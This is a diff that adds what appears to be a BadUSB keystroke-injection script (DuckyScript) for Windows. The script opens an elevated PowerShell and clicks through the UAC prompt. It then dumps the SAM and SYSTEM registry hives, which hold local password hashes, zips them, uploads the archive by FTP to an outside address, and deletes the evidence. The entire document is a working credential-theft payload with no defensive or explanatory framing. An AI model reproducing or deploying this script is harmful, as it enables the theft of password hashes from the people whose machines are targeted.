@@ -1,0 +1,23 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1500
+LEFT
+DELAY 300
+ENTER
+DELAY 1500
+STRING $p = $($env:TEMP); reg save hklm\sam "$p\Sam"; reg save hklm\system "$p\Sys"; Compress-Archive -Path "$p\Sam", "$p\Sys" -DestinationPath "$p\Sam.zip"; remove-item "$p\Sam"; remove-item "$p\Sys"; 
+DELAY 300
+ENTER
+STRING $client = New-Object System.Net.WebClient; $client.Credentials = New-Object System.Net.NetworkCredential("USERNAME", "PASSWORD"); $client.UploadFile("ftp://192.168.111.222/sam.zip", "$p\Sam.zip")
+DELAY 500
+ENTER
+STRING rm "$p\Sam.zip"
+DELAY 500
+ENTER
+DELAY 500
+STRING exit
+DELAY 300
+ENTER
